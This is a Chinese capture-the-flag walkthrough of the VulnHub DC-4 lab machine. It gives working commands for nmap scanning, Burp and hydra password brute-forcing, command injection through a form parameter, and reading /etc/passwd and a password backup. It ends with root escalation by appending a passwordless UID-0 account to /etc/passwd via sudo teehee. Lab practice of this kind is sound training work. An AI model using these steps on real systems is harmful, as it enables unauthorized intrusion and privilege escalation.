靶场搭建

靶场下载地址：https://www.vulnhub.com/entry/dc-4,313/

下载镜像（Mirror版本）

下载下来的文件为 .OVA压缩文件，直接导入vmvare指定解压位置即可

网卡设置和攻击机KALI保持一致即可，这里我选择NAT模式

开机，靶场搭建完毕

渗透测试

首先明确目标，只有一个flag，有很多种进入的方法，没有提示

由于不知道靶机IP地址，所以使用nmap扫描整个网段

nmap -sP -T4 192.168.48.0/24

发现136和140两台主机（1,2,254是网关和广播地址）

136是KALI攻击机，所以靶机地址为192.168.48.140

扫描靶机

nmap -sS -A -p 1-65535 192.168.48.140

开启了22端口ssh远程登录服务，可能存在密码破解

开启了80端口，存在web

访问web

有登录框，登录burpsuite抓包看看

不存在token、验证码等随机参数，可以爆破

发送到intruder模块爆破

选择密码字典

爆破成功，密码为happy

登录成功

发现执行命令的选项

可以执行三个不同的命令

抓包看看能不能自己修改命令

在包中看到对应命令

尝试着修改看变化

发现可以执行任意命令，并且发现权限是普通用户权限

通过命令行传入马

首先用msf生成一个马

pwd查看当前路径

写入马

写入过程中发现空格必须用+代替，不然会被认为命令终止

我们需要把马里的空格全部换成+

将马内容复制到windows文本中，将所有空格替换成+

radio=echo+"马"+>>+/usr/share/nginx/html

写入尝试了很多次都失败了

只能通过其它方法

浏览一下其它目录，看看有没有什么线索

cat /etc/passwd

ls -l /home

ls -l /home/charles

ls -l /home/jim

ls -l /home/sam

ls -l /home/jim/backups

cat /home/jim/backups/old-passwords.bak

发现一个密码字典，将字典复制出来


/home下存在三个用户charles、jim、sam

将这三个用户保存为一个用户名字典

然后利用kali自带工具hydra进行密码爆破

hydra -L dc4user.txt -P dc4pass.TXT 192.168.48.140 ssh

爆破出jim/jibril04

登录ssh

ssh jim@192.168.48.140

whoami 查看用户权限

cat mbox

mbox显示root给jim发了一个邮件

cd /var/mail

看到一个邮件

cat jim

在这个邮件中找到了charles的密码

登录charles账号

再找找有没有线索，没有找到线索

进行提权

Linux提权

1、内核提权(脏牛肉提权）

2、suid提权

3、sudo提权

4、数据库提权


sudo -l 查看特权命令

发现特权命令teehee

查看这个命令的帮助信息

teehee --help

看到teehee -a 可以写入文件，非覆盖

可以写入一个最高权限账户

用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell

echo "qwe::0:0:::/bin/bash" | sudo teehee -a /etc/passwd

切换账户

su qwe

获得最高权限

cd /root

cat flag.txt
